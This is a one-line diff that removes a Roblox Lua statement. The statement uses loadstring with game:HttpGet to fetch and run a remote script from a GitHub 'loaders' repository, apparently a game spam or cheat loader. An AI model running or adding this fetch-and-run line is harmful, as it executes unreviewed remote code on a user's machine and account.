@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/catch-the-artist-spam6-pmwqp167oflhe0.lua"))()
